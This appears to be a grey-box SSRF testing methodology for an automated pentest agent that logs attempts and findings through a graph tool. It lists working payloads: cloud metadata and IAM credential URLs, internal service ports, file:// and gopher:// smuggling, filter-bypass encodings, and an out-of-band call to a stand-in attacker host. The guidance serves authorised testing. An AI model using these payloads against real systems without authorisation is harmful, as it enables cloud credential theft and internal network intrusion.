## SSRF Testing Methodology (Grey-Box)

### Phase 1: Input Classification
Identify parameters that could trigger server-side requests:
- URL parameters (`url=`, `link=`, `redirect=`, `callback=`, `webhook=`)
- File path parameters (`file=`, `path=`, `page=`, `template=`)
- Image/media URL parameters (`avatar=`, `image_url=`, `icon=`)
- Import/export parameters (`import_url=`, `feed=`, `rss=`)
- PDF generation inputs (HTML with external references)

```bash
graph-tool claim --id "parameter:avatar_url" --agent "ssrf-specialist" --ttl 600
```

### Phase 2: Basic SSRF Detection

**Out-of-Band Detection (preferred):**
Use a Burp Collaborator or webhook.site equivalent to detect server-side requests:
1. Set up a listener endpoint you control (or use a public request bin)
2. Submit the listener URL as the parameter value
3. Check if the server makes a request to your listener

```bash
graph-tool test-attempt \
  --target "parameter:avatar_url" \
  --vuln-type ssrf \
  --technique "out-of-band detection" \
  --payload "http://attacker-listener.example/ssrf-test" \
  --result inconclusive \
  --response-code 200 \
  --response-excerpt "Image processed but no OOB callback received"
```

**Error-Based Detection:**
Submit URLs that should cause different error behaviors:
- `http://127.0.0.1:22` (SSH port — different error than valid HTTP)
- `http://127.0.0.1:3306` (MySQL port)
- `http://192.168.1.1` (private IP — error if internal access works)
- `http://[::1]` (IPv6 localhost)

**Time-Based Detection:**
- `http://example.com:81` (likely to timeout — measure response delay)
- Compare response time for fast vs slow targets

### Phase 3: Internal Service Probing
If basic SSRF is confirmed, probe internal resources:

**Cloud Metadata Services:**
- AWS: `http://169.254.169.254/latest/meta-data/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- DigitalOcean: `http://169.254.169.254/metadata/v1/`

**Common Internal Services:**
- `http://127.0.0.1:8080` (admin panels, monitoring)
- `http://127.0.0.1:6379` (Redis)
- `http://127.0.0.1:9200` (Elasticsearch)
- `http://127.0.0.1:5432` (PostgreSQL)
- `http://127.0.0.1:27017` (MongoDB)
- `http://localhost:3000` (development servers)

```bash
graph-tool test-attempt \
  --target "parameter:webhook_url" \
  --vuln-type ssrf \
  --technique "cloud-metadata-probe" \
  --payload "http://169.254.169.254/latest/meta-data/" \
  --result success \
  --response-code 200 \
  --response-excerpt "ami-id, instance-type, local-ipv4 visible in response"
```

### Phase 4: Protocol Smuggling
Test non-HTTP protocols if the server follows them:
- `file:///etc/passwd` (local file read)
- `gopher://127.0.0.1:6379/_INFO` (Redis interaction)
- `dict://127.0.0.1:6379/INFO` (dictionary protocol)
- `ftp://127.0.0.1/` (FTP enumeration)

### Phase 5: Filter Bypass Techniques
If URL validation is present, try at least 8 bypass methods:
- IP encoding: `http://0x7f000001/` (hex), `http://2130706433/` (decimal)
- DNS rebinding: Use a DNS name that resolves to 127.0.0.1
- URL parsing confusion: `http://evil.com@127.0.0.1/`
- Redirect chains: `http://your-server/redirect?to=http://127.0.0.1`
- URL encoding: `http://127.0.0.1/%2e%2e/etc/passwd`
- IPv6 mapping: `http://[::ffff:127.0.0.1]/`
- Alternative representations: `http://127.1/`, `http://0/`
- Case variation in protocols: `HTTP://`, `Http://`

```bash
graph-tool test-attempt \
  --target "parameter:webhook_url" \
  --vuln-type ssrf \
  --technique "ssrf-bypass: decimal-ip" \
  --payload "http://2130706433/latest/meta-data/" \
  --result fail \
  --response-code 400 \
  --response-excerpt "Invalid URL format"
```

### Phase 6: Impact Demonstration
For confirmed SSRF, demonstrate maximum impact:
1. Cloud credential extraction from metadata service
2. Internal service enumeration (port scan via SSRF)
3. Internal data read (Redis KEYS, Elasticsearch indices)
4. File read via file:// protocol

```bash
graph-tool finding \
  --target "parameter:webhook_url" \
  --vuln-type ssrf \
  --severity critical \
  --cwe CWE-918 \
  --title "SSRF in webhook URL allows cloud metadata access" \
  --poc-payload "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  --impact "AWS IAM credentials extractable via metadata service — full cloud account compromise" \
  --grants '["cloud_credentials","internal_network_access"]' \
  --requires '["authenticated"]' \
  --evidence-file "deliverables/screenshots/ssrf-metadata.png" \
  --derived-from "test_attempt:ta_XXXX"
```

### Phase 7: Classification
- **EXPLOITED**: Server-side request to unintended destination confirmed with response data
- **POTENTIAL**: Server makes outbound requests but filtering prevents reaching critical targets
- **LEAD**: Parameter accepts URLs and processing time varies, suggesting server-side fetch
- **FALSE_POSITIVE**: URLs are validated client-side only or server does not fetch

```bash
graph-tool release --id "parameter:avatar_url" --agent "ssrf-specialist"
```
